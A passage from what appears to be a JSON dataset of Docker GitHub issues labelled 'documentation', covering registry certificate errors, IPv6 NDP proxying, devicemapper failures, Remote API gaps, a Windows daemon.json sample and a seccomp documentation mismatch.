also added to `/etc/docker/certs.d/<url>/ca.crt`:\n`Error response from daemon: Get https://registry.e5.physik.tu-dortmund.de:5000/v1/users/: x509: certificate signed by unknown authority (possibly because of \"x509: invalid signature: parent certificate cannot sign this kind of certificate\" while trying to verify candidate authority certificate \"registry.e5.physik.tu-dortmund.de\")`\n\n**Describe the results you expected:**\nSuccesfull login\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nThe registry is running as a rancher service behind a loadbalancer.\n"},{"labels":["documentation",null,null],"text":"> Mount volume (-v, --read-only)\n> \n> `$ docker  run  -v `pwd`:`pwd` -w `pwd` -i -t  ubuntu pwd`\n> \n> The -v flag mounts the current working directory into the container. The -w lets the command being executed inside the current working directory, by changing into the directory to the value returned by pwd. So this combination executes the command using the container, but inside the current working directory.\n\nSource: https://github.com/docker/docker/blob/master/docs/reference/commandline/run.md#mount-volume--v---read-only\n\nAreas for improvement: :smiley: \n- It assumes the user understands `pwd` command is evaluated to get the current working directory: Perhaps it's simpler to use `/current/directory` in the example instead? (Similar to the the `/doesnt/exist` used in the example just below this block.)\n- Explanation for `-w` switch is confusing. My understanding is that the `-w` refers to a working directory **insider** the container. So the example should explain that the command is executed in a directory inside the container that happens to have the same name as the current working directory. In additional, because of the bind volume, the directory inside the container is mapped to the current working directory on the host.\n"},{"labels":["documentation",null,null],"text":"The installation instructions currently use `$releasever` to configure the right YUM repository to use, however the instructions don't take into account the `Server` releases output the version in a different format (e.g. `7Server` instead of just `7`).\n\n```\n$ sudo tee /etc/yum.repos.d/docker.repo <<-'EOF'\n[dockerrepo]\nname=Docker Repository\nbaseurl=https://yum.dockerproject.org/repo/main/centos/$releasever/\nenabled=1\ngpgcheck=1\ngpgkey=https://yum.dockerproject.org/gpg\nEOF\n```\n\nThe installation script correctly strips the `Server` before generating the URL, so we should update the documentation to do the same, or show how to;\nhttps://github.com/docker/docker/blob/v1.11.2/hack/install.sh#L283-L285\n\nAs reported by Aleksandr Vinokurov on Twitter https://twitter.com/aleksandrvin/status/740548856316858368 (thanks!)\n\nAlso;\nhttps://access.redhat.com/discussions/2134691\n"},{"labels":["documentation",null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.11.2\n API version:  1.23\n Go version:   go1.5.4\n Git commit:   b9f10c9\n Built:        Wed Jun  1 22:00:43 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.11.2\n API version:  1.23\n Go version:   go1.5.4\n Git commit:   b9f10c9\n Built:        Wed Jun  1 22:00:43 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 16\n Running: 13\n Paused: 0\n Stopped: 3\nImages: 270\nServer Version: 1.11.2\nStorage Driver: overlay\n Backing Filesystem: extfs\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins: \n Volume: local\n Network: bridge null host\nKernel Version: 4.4.0-22-generic\nOperating System: Ubuntu 16.04 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 15.54 GiB\nName: bacigalubupc\nID: 4SXZ:24LJ:CLDS:NRQJ:BLRE:WMA3:BVVO:MOGC:DXNW:7COX:L5DX:F4Y6\nDocker Root Dir: /home/UX/lbacigalux/docker\nDebug mode (client): false\nDebug mode (server): true\n File Descriptors: 87\n Goroutines: 145\n System Time: 2016-06-02T16:25:00.463460097+02:00\n EventsListeners: 0\nUsername: lbacigal\nRegistry: https://index.docker.io/v1/\n\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\n**Steps to reproduce the issue:**\n1. `docker volume ls -f name=rose` or `docker volume ls -f driver=local`\n\n**Describe the results you received:**\nError response from daemon: Invalid filter 'name'\n\n**Describe the results you expected:**\nBased on this https://docs.docker.com/engine/reference/commandline/volume_ls/\n\n| DRIVER | VOLUME NAME |\n| --- | --- |\n| local | rosemary |\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nfilter dangling is working\n"},{"labels":["documentation"],"text":"Given there are apparently duplicate properties at the options level and HostConfig level the lack of documentation for the containers/create endpoint in the [Remote API](https://docs.docker.com/engine/reference/api/docker_remote_api_v1.23/#create-a-container) is a blocker.\n\nIn particular, without deep knowledge of the system, how are adopters supposed to differentiate between...\n\n`options.Volumes` vs. `options.HostConfig.Binds`\n\n...or...\n\n`options.ExposedPorts` vs. `options.HostConfig.PortBindings`\n\n...as they appear to be doing the same thing. Probably they are not, but really as [noted before](https://github.com/docker/docker/issues/2949) in an issue not properly closed according to those in the thread, these things are NOT self-describing. If the conventions correspond to equivalent operations documented elsewhere, then this link should be explicit.\n\nHostConfig is not even labelled - what does it do? Isn't the whole JSON-ish structure a host configuration? This is particularly galling since the /run endpoint describes that it 'takes a HostConfig' for backwards compatibility, and links to the documentation for containers/create to clarify, where there is no information describing what the HostConfig object is for, (versus the whole options object, which contains a bunch of host-specific config).\n\nBACKGROUND\n\nI am trying to execute through the Remote API a self-removing (--rm) container configuration already verified interactively through a command line `docker run` invocation. I can't be the only person who works in this way, starting with docker run, and then trying to use an API to automate invocation. \n\nMy attempt to code this through dockerode (backed by the Remote API) very challenging simply because the documentation is so poor (dockerode points to the Remote API documentation as documentation for its own API). \n"},{"labels":["documentation",null,null],"text":"Kube's is somehow generating docs, I didn't look into the details but it's prettty cool, even if its slow as eff to run (maybe we can make it better, I didn't really dig deep). Then maybe we don't have to think about so many things :)\n\nhttps://github.com/kubernetes/kubernetes/blob/master/hack/update-generated-docs.sh\n"},{"labels":[null,"documentation"],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\nhttps://docs.docker.com/engine/reference/api/docker_remote_api_v1.23\n\nCreate a container -- status codes:\n[mistake] 404: no such container --> image\n[miss] 409: the name \"xxx\" is already in use\n[confuse] 406: impossible to attach.\nHow to trigger a 406 error in a create action?\n\nStart a container -- status codes:\n[mistake] 404: no such container --> can also be \"executable file not found in $PATH\"\n"},{"labels":["documentation",null,null],"text":"I've tried to wrap my head around the [Docker IPv6 cluster documentation](https://docs.docker.com/engine/userguide/networking/default_network/ipv6/), but something does not work out.\n\nIt seems that both graphics for [Switched network environment](https://docs.docker.com/engine/userguide/networking/default_network/images/ipv6_switched_network_example.svg)\n![image](https://cloud.githubusercontent.com/assets/636669/15391455/90ccb634-1dc1-11e6-917f-a1da758b3777.png)\nand [Routed network environment](https://docs.docker.com/engine/userguide/networking/default_network/images/ipv6_routed_network_example.svg)\n![image](https://cloud.githubusercontent.com/assets/636669/15391479/aa4a9cfc-1dc1-11e6-8a56-db728d0be83e.png)\n are identical (beside some typos) and are not helping with my issue.\n\nMy use case:\n\nI have a /48 network (`2001:XXXX:45::/48`) and routed two /64 subnetworks (`2001:XXXX:45:2::/64` and `2001:XXXX:45:3::/64`) to my host and assigned one of it to the host and the other to the containers. So Host1 has\n\n```\n$ # ip -6 addr\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qlen 1000\n    inet6 2001:XXXX:45:2::2/64 scope global\n       valid_lft forever preferred_lft forever\n    inet6 fe80::ec4:7aff:fe06:5830/64 scope link\n       valid_lft forever preferred_lft forever\n181: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500\n    inet6 2001:XXXX:45:3::1/64 scope global tentative\n       valid_lft forever preferred_lft forever\n    inet6 fe80::1/64 scope link tentative\n       valid_lft forever preferred_lft forever\n\n\n$ ip -6 route\n2001:XXXX:45:2::/64 dev eth0  proto kernel  metric 256\n2001:XXXX:45:3::/64 dev docker0  proto kernel  metric 256\n2001:XXXX:45:3::/64 dev docker0  metric 1024\nfe80::223:9cff:fefc:6ff0 dev eth0  metric 1024\nfe80::/64 dev eth0  proto kernel  metric 256\nfe80::/64 dev docker0  proto kernel  metric 256\ndefault via fe80::223:9cff:fefc:6ff0 dev eth0  metric 1024\n```\n\nwhile Container1-1, Container1-2, Container1-X get started with\n\n```\nDOCKER_OPTS=\"--dns 8.8.8.8 --dns 8.8.4.4 --fixed-cidr-v6=2001:XXXX:45:3::/64 --ipv6\"\n```\n\nand result in this\n\n```\n$ docker run -it ubuntu:14.04 bash -c 'ip -6 addr; echo '====' ; ip -6 route'\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n190: eth0: <NO-CARRIER,BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet6 2001:XXXX:45:3:0:242:ac11:2/64 scope global nodad\n       valid_lft forever preferred_lft forever\n    inet6 fe80::42:acff:fe11:2/64 scope link tentative\n       valid_lft forever preferred_lft forever\n====\n2001:XXXX:45:3::/64 dev eth0  proto kernel  metric 256\nfe80::/64 dev eth0  proto kernel  metric 256\ndefault via 2001:XXXX:45:3::1 dev eth0  metric 1024\n```\n\nMy issue is: I can't make this work without a NDP proxy on the host. The containers are not able to reach outside world, unless i manually add a NDP proxy on my host, e.g.:\n\n```\n$ sysctl net.ipv6.conf.eth0.proxy_ndp=1\n$ ip -6 neigh add proxy 2001:XXXX:45:3:0:242:ac11:2 dev eth0\n```\n\nWhat am i missing? The documentation gives the impression that NDP proxying is only necessary if using a single /64 - and switches/routed environments should work without NDP proxy.\n"},{"labels":["documentation",null],"text":"Referring to #22166\n\nThe [last commit of the device-mapper documentation](https://github.com/docker/docker/commit/a7b2f87b0637a3711e90c0f1d0a99dd5d32bd60f#diff-52525eec69924c13d098f5d19b2d79adL254) by @chenchun clarified the overall use.\nBut as I go through the steps, I'm missing the part where the thinpool configuration on /data and /metadata is done.\n\nThe [diff shows that the previous version ](https://github.com/docker/docker/pull/22662/commits/3cf8c53515ff8144a63c6d4418738b5d4f4416a7)had this covered in lines 254 and following\n"},{"labels":[null,"documentation",null,null],"text":"Currently it seems very hard to find any documentation on what kind of security is promised by Dockerfile execution, especially if building Dockerfiles from untrusted sources.\n\nAs far as I can gather, the security is as follows:\n- context directory contents are available, but there is no access to files outside it\n- full access to network is available as if running an untrusted docker image\n- escalating access to host is prevented with the same strength as normal untrusted docker images\n- resource constraints are given in docker build command line\n\nThis means that if these limitations are acceptable, it is possible to allow building Dockerfiles from untrusted sources without creating a separate VM or similar to contain the build.\n\nI assume something like this is already done by Docker Hub when builds are submitted to it, as it probably does not use a separate VM for each build, so the priviledge separation probably has been tested quite rigorously.\n\nIs my assessment correct? Should this be explicitly documented somewhere?\n"},{"labels":["documentation",null],"text":"This document discusses two image tags that do not exist on the hub (https://hub.docker.com/r/docker/trusttest/tags/).\n\nhttps://github.com/docker/docker/blob/861815a3252b88a118a91a164246401fa24fa549/docs/security/trust/content_trust.md\n\n```\ndocker pull --disable-content-trust docker/trusttest:untrusted\nPulling repository docker.io/docker/trusttest\nTag untrusted not found in repository docker.io/docker/trusttest\n```\n\n```\ndocker pull docker/seaside\nUsing default tag: latest\nPulling repository docker.io/docker/seaside\nError: image docker/seaside not found\n```\n\nI'm guessing docker/trusttest:untrusted has become docker/trusttest:latest.  docker/seaside seems to have been removed.\n"},{"labels":["documentation",null],"text":"The current text:\n\n> when that variable’s current value is passed through (i.e. `$MYVAR1` from the host is set to `$MYVAR1` in the container).\n\ncould be usefully be changed to:\n\n> when that variable’s current value, set via `export`, is passed through (i.e. `$MYVAR1` from the host is set to `$MYVAR1` in the container, where `export MYVAR1=\"foo\"` was used).\n"},{"labels":["documentation",null,null],"text":"The list of allowed configuration options in [this document](https://docs.docker.com/engine/reference/commandline/daemon/#daemon-configuration-file) is not applicable to Windows. Several of the options do not work on Windows. I think this requires minor clarification, perhaps a sample that is applicable to Windows:\n\nWhen used as is, the following is returned:\n\n``` none\nPS C:\\> dockerd\ntime=\"2016-05-12T15:40:59-07:00\" level=fatal msg=\"unable to configure the Docker daemon with file C:\\\\ProgramData\\\\docker\\\\config\\\\daemon.json: the following directives don't match any configuration option: iptables, bip, icc, api-cors-headers, exec-root, default-gateway-v6, ipv6, cgroup-parent, ip-mask, ip, userland-proxy, default-gateway, ip-forward, selinux-enabled, userns-remap, fixed-cidr-v6\\n\"\n```\n\nHere is a working sample:\n\n``` json\n{\n    \"authorization-plugins\": [],\n    \"dns\": [],\n    \"dns-opts\": [],\n    \"dns-search\": [],\n    \"exec-opts\": [],\n    \"storage-driver\": \"\",\n    \"storage-opts\": [],\n    \"labels\": [],\n    \"log-driver\": \"\", \n    \"mtu\": 0,\n    \"pidfile\": \"\",\n    \"graph\": \"\",\n    \"cluster-store\": \"\",\n    \"cluster-advertise\": \"\",\n    \"debug\": true,\n    \"hosts\": [\"tcp://0.0.0.0:2376\", \"npipe://\"],\n    \"log-level\": \"\",\n    \"tlsverify\": true,\n    \"tlscacert\": \"C:\\\\ProgramData\\\\docker\\\\certs.d\\\\ca.pem\",\n    \"tlscert\": \"C:\\\\ProgramData\\\\docker\\\\certs.d\\\\server-cert.pem\",\n    \"tlskey\": \"C:\\\\ProgramData\\\\docker\\\\certs.d\\\\server-key.pem\",\n    \"group\": \"\",\n    \"default-ulimits\": {},\n    \"bridge\": \"\",\n    \"fixed-cidr\": \"\",\n    \"raw-logs\": false,\n    \"registry-mirrors\": [],\n    \"insecure-registries\": [],\n    \"disable-legacy-registry\": false\n}\n\n```\n\nIf this makes sense, and is in line with the docs scope / purpose, I am happy write up and propose the changes.\n\nneilp\n"},{"labels":["documentation",null,null],"text":"Hi fellow volume plugin developers!\n\nI'm currenty writing my first volume plugin and I have some questions that are not really answered in the API documentation. I will send a pull request that clarifies these points because I think it will also help others:\n\nOn .Create I create a special device, let's call it /dev/specialdev_name and put a file system on top of it.\nOn .Mount I mount it and reference count for the name. The first .Mount really mounts the file system, further .Mounts increase the refcount.\nOn .Umount I decrease the refcount and if 0, I umount the /dev/specialdev_name\nOn .Remove I remove the /dev/specialdev_name if the refcount is 0/is not mounted, otherwise I set Err.\n\nSo far so easy, the problem are .Path (and .Get and .List). To me it is not clear how to react if a volume is known to the driver (i.e., it was created with .Create), but is currently _not_ mounted. Should I report the \"Mountpoint\" where it will be available after a .Mount, or set \"Err\"? The same question applies for .Get. For .List it seams that I should include volumes known but not mounted, otherwise they don't show up in \"docker volume ls\". But yeah, it all boils down to this \"known to the plugin and created, but currently not mounted\" situation. Set Mountpoint to where it will be available after .Mount? Or set Mountpoint to \"\"? Or even set Err?\n"},{"labels":["documentation"],"text":"**Output of `docker version`:**\n\n```\nDocker version 1.11.1, build 5604cbe\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 0\n Running: 0\n Paused: 0\n Stopped: 0\nImages: 1\nServer Version: 1.11.1\nStorage Driver: devicemapper\n Pool Name: docker-253:0-394509-pool\n Pool Blocksize: 65.54 kB\n Base Device Size: 10.74 GB\n Backing Filesystem: xfs\n Data file: /dev/loop0\n Metadata file: /dev/loop1\n Data Space Used: 19.07 MB\n Data Space Total: 107.4 GB\n Data Space Available: 38.76 GB\n Metadata Space Used: 589.8 kB\n Metadata Space Total: 2.147 GB\n Metadata Space Available: 2.147 GB\n Udev Sync Supported: true\n Deferred Removal Enabled: false\n Deferred Deletion Enabled: false\n Deferred Deleted Device Count: 0\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\n WARNING: Usage of loopback devices is strongly discouraged for production use. Either use `--storage-opt dm.thinpooldev` or use `--storage-opt dm.no_warn_on_loop_devices=true` to suppress this warning.\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\n Library Version: 1.02.107-RHEL7 (2015-12-01)\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins: \n Volume: local\n Network: bridge null host\nKernel Version: 3.10.0-327.13.1.el7.x86_64\nOperating System: CentOS Linux 7 (Core)\nOSType: linux\nArchitecture: x86_64\nCPUs: 2\nTotal Memory: 1.797 GiB\nName: localhost.localdomain\nID: E3X2:DQ6O:DVIO:2NPO:XFY7:6P65:SQG2:TXLM:EERQ:GFSO:NUWT:JF3S\nDocker Root Dir: /var/lib/docker\nDebug mode (client): false\nDebug mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: bridge-nf-call-iptables is disabled\nWARNING: bridge-nf-call-ip6tables is disabled\n\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):** Vagrant centos/7 box\n\n**Steps to reproduce the issue:**\n1. Start docker as a bootstrap service in one console:\n\n```\ndocker daemon \\\n        -H unix:///var/run/docker-bootstrap.sock \\\n        -p /var/run/docker-bootstrap.pid \\\n        --iptables=false \\\n        --ip-masq=false \\\n        --bridge=none \\\n        --graph=/var/lib/docker-bootstrap --debug\n```\n1. Start container in second console:\n\n```\ndocker -H unix:///var/run/docker-bootstrap.sock run -it --rm busybox sh\n```\n\n**Describe the results you received:**\n\n```\nStatus: Downloaded newer image for busybox:latest\ndocker: Error response from daemon: rpc error: code = 2 desc = \"oci runtime error: rootfs (\\\"/var/lib/docker-bootstrap/devicemapper/mnt/8c8cc49901da0ddbdd24298a7b294dc7a516a9c72d05055fd882964101f46897/rootfs\\\") does not exist\".\n```\n\n**Excerpts from docker daemon logs with debugs enabled**\n\n```\nDEBU[0044] Calling POST /v1.23/containers/create        \nDEBU[0044] form data: {\"AttachStderr\":true,\"AttachStdin\":true,\"AttachStdout\":true,\"Cmd\":[\"sh\"],\"Domainname\":\"\",\"Entrypoint\":null,\"Env\":[],\"HostConfig\":{\"AutoRemove\":false,\"Binds\":null,\"BlkioBps\":0,\"BlkioDeviceReadBps\":null,\"BlkioDeviceReadIOps\":null,\"BlkioDeviceWriteBps\":null,\"BlkioDeviceWriteIOps\":null,\"BlkioIOps\":0,\"BlkioWeight\":0,\"BlkioWeightDevice\":null,\"CapAdd\":null,\"CapDrop\":null,\"Cgroup\":\"\",\"CgroupParent\":\"\",\"ConsoleSize\":[0,0],\"ContainerIDFile\":\"\",\"CpuCount\":0,\"CpuPercent\":0,\"CpuPeriod\":0,\"CpuQuota\":0,\"CpuShares\":0,\"CpusetCpus\":\"\",\"CpusetMems\":\"\",\"Devices\":[],\"DiskQuota\":0,\"Dns\":[],\"DnsOptions\":[],\"DnsSearch\":[],\"ExtraHosts\":null,\"GroupAdd\":null,\"IpcMode\":\"\",\"Isolation\":\"\",\"KernelMemory\":0,\"Links\":null,\"LogConfig\":{\"Config\":{},\"Type\":\"\"},\"Memory\":0,\"MemoryReservation\":0,\"MemorySwap\":0,\"MemorySwappiness\":-1,\"NetworkMode\":\"default\",\"OomKillDisable\":false,\"OomScoreAdj\":0,\"PidMode\":\"\",\"PidsLimit\":0,\"PortBindings\":{},\"Privileged\":false,\"PublishAllPorts\":false,\"ReadonlyRootfs\":false,\"RestartPolicy\":{\"MaximumRetryCount\":0,\"Name\":\"no\"},\"SandboxSize\":0,\"SecurityOpt\":null,\"ShmSize\":0,\"StorageOpt\":null,\"UTSMode\":\"\",\"Ulimits\":null,\"UsernsMode\":\"\",\"VolumeDriver\":\"\",\"VolumesFrom\":null},\"Hostname\":\"\",\"Image\":\"busybox\",\"Labels\":{},\"NetworkingConfig\":{\"EndpointsConfig\":{}},\"OnBuild\":null,\"OpenStdin\":true,\"StdinOnce\":true,\"Tty\":true,\"User\":\"\",\"Volumes\":{},\"WorkingDir\":\"\"} \nDEBU[0044] devmapper: AddDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init basehash=a88c80f3742d46b2f22e9c41acb7d4ca83c59054bbe8efdd7f196b7d5f8a7ca3) \nDEBU[0044] devmapper: registerDevice(17, 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0044] devmapper: AddDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init basehash=a88c80f3742d46b2f22e9c41acb7d4ca83c59054bbe8efdd7f196b7d5f8a7ca3) END \nDEBU[0044] devmapper: activateDeviceIfNeeded(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0044] devmapper: UnmountDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0044] devmapper: Unmount(/var/lib/docker-bootstrap/devicemapper/mnt/35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: Unmount done                      \nDEBU[0045] devmapper: deactivateDevice(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: removeDevice START(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: removeDevice END(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: deactivateDevice END(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: UnmountDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) END \nDEBU[0045] devmapper: AddDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032 basehash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: registerDevice(18, 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: AddDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032 basehash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) END \nDEBU[0045] devmapper: activateDeviceIfNeeded(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] container mounted via layerStore: /var/lib/docker-bootstrap/devicemapper/mnt/35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032/rootfs \nDEBU[0045] devmapper: UnmountDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: Unmount(/var/lib/docker-bootstrap/devicemapper/mnt/35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: Unmount done                      \nDEBU[0045] devmapper: deactivateDevice(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: removeDevice START(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: removeDevice END(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: deactivateDevice END(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: UnmountDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) END \nDEBU[0045] Calling POST /v1.23/containers/f5ff62db4ba13a71321d8d5ea77e7c5990617de72214c417b441a63d1651c16b/attach?stderr=1&stdin=1&stdout=1&stream=1 \nDEBU[0045] attach: stdin: begin                         \nDEBU[0045] attach: stdout: begin                        \nDEBU[0045] attach: stderr: begin                        \nDEBU[0045] Calling POST /v1.23/containers/f5ff62db4ba13a71321d8d5ea77e7c5990617de72214c417b441a63d1651c16b/start \nDEBU[0045] devmapper: activateDeviceIfNeeded(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] container mounted via layerStore: /var/lib/docker-bootstrap/devicemapper/mnt/35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032/rootfs \nDEBU[0045] devmapper: UnmountDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: Unmount(/var/lib/docker-bootstrap/devicemapper/mnt/35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] attach: stdout: end                          \nDEBU[0045] attach: stdin: end                           \nDEBU[0045] attach: stderr: end                          \nDEBU[0045] devmapper: Unmount done                      \nDEBU[0045] devmapper: deactivateDevice(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: removeDevice START(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: removeDevice END(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: deactivateDevice END(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: UnmountDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) END \nERRO[0045] Handler for POST /v1.23/containers/f5ff62db4ba13a71321d8d5ea77e7c5990617de72214c417b441a63d1651c16b/start returned error: rpc error: code = 2 desc = \"oci runtime error: rootfs (\\\"/var/lib/docker-bootstrap/devicemapper/mnt/35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032/rootfs\\\") does not exist\" \nDEBU[0045] Calling DELETE /v1.23/containers/f5ff62db4ba13a71321d8d5ea77e7c5990617de72214c417b441a63d1651c16b?v=1 \nDEBU[0045] devmapper: DeleteDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032 syncDelete=false) START \nDEBU[0045] devmapper: issueDiscard(device: 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032). START \nDEBU[0045] devmapper: activateDeviceIfNeeded(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: issueDiscard(device: 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032). END \nDEBU[0045] devmapper: deactivateDevice(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: removeDevice START(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: removeDevice END(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: deactivateDevice END(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: unregisterDevice(18, 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: DeleteDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032 syncDelete=false) END \nDEBU[0045] devmapper: DeleteDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init syncDelete=false) START \nDEBU[0045] devmapper: issueDiscard(device: 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init). START \nDEBU[0045] devmapper: activateDeviceIfNeeded(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: issueDiscard(device: 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init). END \nDEBU[0045] devmapper: deactivateDevice(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: removeDevice START(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: removeDevice END(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: deactivateDevice END(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: unregisterDevice(17, 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: DeleteDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init syncDelete=false) END \nDEBU[0045] Closing buffered stdin pipe         \n```\n"},{"labels":[null,"documentation",null],"text":"I understand that the manifest format introduced in v1.10 includes the digest of every image layer, and that the Docker Daemon verifies the digest of every image layer on pull (regardless of whether the image is specified by tag or by digest).\n\nThis very important information seems to be absent from all public-facing docs I've been able to find -- e.g. https://docs.docker.com/engine/reference/api/docker_remote_api_v1.22/\n\nI'd appreciate a pointer to anything public-facing that does state this.  Thanks.\n"},{"labels":["documentation"],"text":"I was just looking into CVE-2015-5157. It seems to be a problem because modify_ldt syscall is allowed by default (https://github.com/docker/docker/blob/master/profiles/seccomp/default.json).\n\nHowever, on the docs page it says it should be blocked by default (https://docs.docker.com/engine/security/seccomp/) because \"Old syscall only used in 16-bit code and a potential information leak.\" which sounds like a sensible 